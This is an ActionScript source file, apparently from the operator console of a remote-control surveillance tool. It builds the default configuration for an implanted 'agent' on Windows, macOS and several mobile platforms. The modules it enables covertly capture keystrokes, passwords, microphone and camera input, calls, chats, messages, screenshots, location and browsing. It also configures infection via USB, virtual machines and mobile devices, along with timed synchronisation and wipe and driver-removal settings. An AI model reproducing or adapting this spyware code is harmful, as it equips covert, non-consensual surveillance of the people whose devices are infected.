package it.ht.rcs.console
{
  import it.ht.rcs.console.agent.model.Agent;
  
  import mx.collections.ArrayCollection;
  
  public class DefaultConfigBuilder
  {
    
    private static var agent:Agent;
    
    public static function getDefaultConfig(a:Agent):Object
    {
      agent = a;
      
      var config:Object = {};
      config.modules = getModules();
      config.events  = [{ desc: "SYNC", event: "timer", subtype: "loop", repeat: 0, delay: 60, ts: "00:00:00", te: "23:59:59", enabled: true }];
      config.actions = [{ desc: "SYNC", subactions: [{ action: "synchronize",
                                                       host: "",
                                                       bandwidth: 500000,
                                                       mindelay: 0,
                                                       maxdelay: 0,
                                                       stop: false,
                                                       wifi: false,
                                                       cell: false }] }];
      config.globals = getGlobals();
      
      return config;
    }
    
    private static function getModules():Array
    {
      
      var modules:Array = [
        {
          module: "addressbook",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "application",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "calendar",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "call",
          buffer: 524288,
          compression: 5,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "camera",
          quality: "med",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "chat",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "clipboard",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "conference",
          _type: "mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "crisis",
          network: {enabled: false, processes: []},
          hook: {enabled: true, processes: []},
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "device",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "file",
          open: false,
          capture: false,
          minsize: 1,
          maxsize: 500000,
          date: '2010-01-01 00:00:00',
          accept: [],
          deny: [],
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "infection",
          local: false,
          usb: false,
          vm: 0,
          mobile: false,
          agent: '',
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "keylog",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "messages",
          mail: {filter: {maxsize: 0, datefrom: "2010-01-21 00:00:00", dateto: ''}},
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mic",
          autosense: false,
          silence: 5,
          threshold: 0.22,
          vad: false,
          vadthreshold: 50,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "mouse",
          width: 40,
          height: 40,
          _type: "desktop",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "password",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "position",
          gps: false,
          cell: false,
          wifi: true,
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "print",
          quality: "med",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "screenshot",
          onlywindow: false,
          quality: "med",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        },
        
        {
          module: "social",
          _type: "desktop",
          _platform: "windows"
        },
        
        {
          module: "url",
          _type: "desktop,mobile",
          _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
        }
      ];
      
      var ac:ArrayCollection = new ArrayCollection(modules);
      ac.filterFunction = moduleFilterFunction;
      ac.refresh();
      
      var filteredModules:Array = ac.toArray();
      for each (var m:Object in filteredModules) {
        delete m._type;
        delete m._platform;
      }
      
      return filteredModules;
      
    }
    
    private static function moduleFilterFunction(item:Object):Boolean
    {
      return item._type.indexOf(agent.type) != -1;
      //return true;
    }
    
    private static function getGlobals():Object
    {
      var min:Number = agent.type == 'desktop' ? 1000000000 : 100000000; // 1 GB, 100 MB
      var max:Number = agent.type == 'desktop' ? 1000000000 : 100000000; // 1 GB, 100 MB
      var globals:Object = {
                             quota: { min: min, max: max },
                             wipe: false,
                             remove_driver: true,
                             nohide: [],
                             type: agent.type,
                             advanced: false,
                             collapsed: false
                           };
      
      return globals;
      
    }
    
  }
  
}